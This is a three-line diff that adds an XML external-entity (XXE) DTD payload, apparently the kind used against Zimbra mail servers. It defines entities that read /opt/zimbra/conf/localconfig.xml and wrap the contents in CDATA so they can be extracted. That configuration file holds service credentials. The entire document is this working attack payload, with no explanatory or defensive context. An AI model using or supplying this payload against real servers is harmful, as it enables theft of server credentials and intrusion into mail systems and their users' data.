@@ -1,0 +1,3 @@
+<!ENTITY % test SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
+<!ENTITY % eval "<!ENTITY myfile '<![CDATA[%test;]]>'>">
+%eval;
